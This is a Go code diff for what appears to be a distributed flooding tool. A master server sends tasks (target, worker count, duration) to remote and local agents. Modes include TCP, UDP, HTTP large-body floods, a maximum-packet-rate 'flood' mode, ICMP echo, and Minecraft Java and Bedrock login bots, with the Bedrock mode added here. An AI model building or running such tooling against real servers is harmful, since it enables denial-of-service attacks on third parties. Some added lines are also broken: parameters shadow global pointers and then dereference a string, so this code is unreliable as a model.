@@ -471,7 +471,7 @@ func (s *MasterServer) handleAgentStatusMsg(agentID string, msg map[string]inter
 // ============================================================
 
 // startTaskOnAgents 向指定 Agent 下发启动任务
-func (s *MasterServer) startTaskOnAgents(mode, target string, workers, size int, duration string, agentIDs []string) int {
+func (s *MasterServer) startTaskOnAgents(mode, target string, workers, size int, duration string, agentIDs []string, mcAction string, mcProtocol int) int {
 	if size <= 0 {
 		size = 1400
 	}
@@ -481,11 +481,13 @@ func (s *MasterServer) startTaskOnAgents(mode, target string, workers, size int,
 		"type":    "start",
 		"task_id": taskID,
 		"config": map[string]interface{}{
-			"mode":     mode,
-			"target":   target,
-			"workers":  workers,
-			"size":     size,
-			"duration": duration,
+			"mode":        mode,
+			"target":      target,
+			"workers":     workers,
+			"size":        size,
+			"duration":    duration,
+			"mc_action":   mcAction,
+			"mc_protocol": mcProtocol,
 		},
 	}
 
@@ -506,7 +508,7 @@ func (s *MasterServer) startTaskOnAgents(mode, target string, workers, size int,
 				}
 			} else if agentID == "local" {
 				log.Printf("向本地 Agent 下发任务...")
-				go s.runLocalTask(mode, target, workers, size, duration)
+				go s.runLocalTask(mode, target, workers, size, duration, mcAction, mcProtocol)
 				sent++
 			} else {
 				log.Printf("Agent %s 离线，无法下发任务", agentID)
@@ -563,7 +565,7 @@ func (s *MasterServer) stopLocalTask() {
 }
 
 // runLocalTask 本地 Agent 执行任务
-func (s *MasterServer) runLocalTask(taskMode, taskTarget string, taskWorkers, taskSize int, duration string) {
+func (s *MasterServer) runLocalTask(taskMode, taskTarget string, taskWorkers, taskSize int, duration string, mcAction string, mcProtocol int) {
 	log.Printf("本地任务启动: mode=%s target=%s workers=%d size=%d", taskMode, taskTarget, taskWorkers, taskSize)
 	startTime := time.Now()
 
@@ -575,6 +577,24 @@ func (s *MasterServer) runLocalTask(taskMode, taskTarget string, taskWorkers, ta
 	*target = taskTarget
 	*workers = taskWorkers
 	*payloadSize = taskSize
+
+	// 应用 Minecraft 子动作/协议号
+	if mcAction != "" {
+		switch taskMode {
+		case "mc":
+			*mcAction = mcAction
+		case "mcpe":
+			*mcpeAction = mcAction
+		}
+	}
+	if mcProtocol > 0 {
+		switch taskMode {
+		case "mc":
+			*mcProtocol = mcProtocol
+		case "mcpe":
+			*mcpeProtocol = mcProtocol
+		}
+	}
 
 	var dur time.Duration
 	if duration != "" && duration != "0" {
@@ -676,6 +696,8 @@ func (s *MasterServer) runLocalTask(taskMode, taskTarget string, taskWorkers, ta
 			go httpWorker(ctx, &wg, i, lim)
 		case "mc":
 			go mcWorker(ctx, &wg, i)
+		case "mcpe":
+			go mcpeWorker(ctx, &wg, i)
 		case "flood":
 			if *floodProto == "udp" {
 				if !*floodChurn && *floodBatch > 1 {
@@ -801,18 +823,22 @@ func runAgentConnection(server *MasterServer, masterURL, agentID, agentName, tok
 		switch cmd.Type {
 		case "start":
 			var cfg struct {
-				Mode     string `json:"mode"`
-				Target   string `json:"target"`
-				Workers  int    `json:"workers"`
-				Size     int    `json:"size"`
-				Duration string `json:"duration"`
+				Mode       string `json:"mode"`
+				Target     string `json:"target"`
+				Workers    int    `json:"workers"`
+				Size       int    `json:"size"`
+				Duration   string `json:"duration"`
+				Rate       float64 `json:"rate"`
+				MCAction   string `json:"mc_action"`
+				MCProtocol int    `json:"mc_protocol"`
 			}
 			if err := json.Unmarshal(cmd.Config, &cfg); err != nil {
 				log.Printf("任务配置解析失败: %v", err)
 				continue
 			}
-			log.Printf("收到任务: mode=%s target=%s workers=%d size=%d", cfg.Mode, cfg.Target, cfg.Workers, cfg.Size)
-			go server.runRemoteTask(cfg.Mode, cfg.Target, cfg.Workers, cfg.Size, cfg.Duration, conn, agentID)
+			log.Printf("收到任务: mode=%s target=%s workers=%d size=%d mc_action=%s",
+				cfg.Mode, cfg.Target, cfg.Workers, cfg.Size, cfg.MCAction)
+			go server.runRemoteTask(cfg.Mode, cfg.Target, cfg.Workers, cfg.Size, cfg.Duration, conn, agentID, cfg.MCAction, cfg.MCProtocol)
 
 		case "config_update":
 			var updateData ConfigUpdateData
@@ -839,7 +865,7 @@ func runAgentConnection(server *MasterServer, masterURL, agentID, agentName, tok
 }
 
 // runRemoteTask 远程 Agent 执行任务
-func (s *MasterServer) runRemoteTask(taskMode, taskTarget string, taskWorkers, taskSize int, duration string, conn *websocket.Conn, agentID string) {
+func (s *MasterServer) runRemoteTask(taskMode, taskTarget string, taskWorkers, taskSize int, duration string, conn *websocket.Conn, agentID string, mcAction string, mcProtocol int) {
 	log.Printf("开始执行任务: mode=%s target=%s workers=%d size=%d", taskMode, taskTarget, taskWorkers, taskSize)
 
 	atomic.StoreInt64(&totalBytes, 0)
@@ -850,6 +876,24 @@ func (s *MasterServer) runRemoteTask(taskMode, taskTarget string, taskWorkers, t
 	*target = taskTarget
 	*workers = taskWorkers
 	*payloadSize = taskSize
+
+	// 应用主控下发的 Minecraft 子动作/协议号
+	if mcAction != "" {
+		switch taskMode {
+		case "mc":
+			*mcAction = mcAction
+		case "mcpe":
+			*mcpeAction = mcAction
+		}
+	}
+	if mcProtocol > 0 {
+		switch taskMode {
+		case "mc":
+			*mcProtocol = mcProtocol
+		case "mcpe":
+			*mcpeProtocol = mcProtocol
+		}
+	}
 
 	var dur time.Duration
 	if duration != "" && duration != "0" {
@@ -957,6 +1001,8 @@ func (s *MasterServer) runRemoteTask(taskMode, taskTarget string, taskWorkers, t
 			go httpWorker(ctx, &wg, i, lim)
 		case "mc":
 			go mcWorker(ctx, &wg, i)
+		case "mcpe":
+			go mcpeWorker(ctx, &wg, i)
 		case "flood":
 			if *floodProto == "udp" {
 				if !*floodChurn && *floodBatch > 1 {
@@ -1325,9 +1371,13 @@ func (s *MasterServer) cliStartTask(reader *bufio.Reader) {
 
 	// 选择模式
 	fmt.Println("  选择模式:")
-	fmt.Println("    [1] tcp")
-	fmt.Println("    [2] udp")
-	fmt.Println("    [3] http")
+	fmt.Println("    [1] tcp          长连接持续写")
+	fmt.Println("    [2] udp          逐包发送")
+	fmt.Println("    [3] http         POST 大 body")
+	fmt.Println("    [4] mc           Java版 Minecraft 登录/查服")
+	fmt.Println("    [5] mcpe         基岩版 Minecraft 登录/查服 (RakNet/UDP)")
+	fmt.Println("    [6] flood        极限 pps (tcp/udp/http)")
+	fmt.Println("    [7] icmp         ICMP echo (需 root)")
 	fmt.Print("  模式 > ")
 	modeChoice := readLine(reader)
 
@@ -1339,10 +1389,36 @@ func (s *MasterServer) cliStartTask(reader *bufio.Reader) {
 		taskMode = "udp"
 	case "3":
 		taskMode = "http"
+	case "4":
+		taskMode = "mc"
+	case "5":
+		taskMode = "mcpe"
+	case "6":
+		taskMode = "flood"
+	case "7":
+		taskMode = "icmp"
 	default:
 		fmt.Println(colorRed + "  无效模式，按 Enter 返回..." + colorReset)
 		readLine(reader)
 		return
+	}
+
+	// Minecraft 系列：询问子动作
+	taskMCAction := ""
+	taskMCProtocol := 0
+	if taskMode == "mc" || taskMode == "mcpe" {
+		fmt.Println("  子动作: [1] login 登录挂机  [2] status 仅查服")
+		fmt.Print("  子动作 > ")
+		act := readLine(reader)
+		if act == "2" {
+			taskMCAction = "status"
+		}
+		fmt.Print("  协议版本号 (回车=默认): ")
+		if p := readLine(reader); p != "" {
+			if pv, err := strconv.Atoi(p); err == nil {
+				taskMCProtocol = pv
+			}
+		}
 	}
 
 	// 目标地址
@@ -1439,7 +1515,7 @@ func (s *MasterServer) cliStartTask(reader *bufio.Reader) {
 		return
 	}
 
-	sent := s.startTaskOnAgents(taskMode, taskTarget, taskWorkers, taskSize, durStr, selectedIDs)
+	sent := s.startTaskOnAgents(taskMode, taskTarget, taskWorkers, taskSize, durStr, selectedIDs, taskMCAction, taskMCProtocol)
 	fmt.Printf(colorGreen+"  已向 %d 个 Agent 下发任务，按 Enter 返回..."+colorReset, sent)
 	readLine(reader)
 }
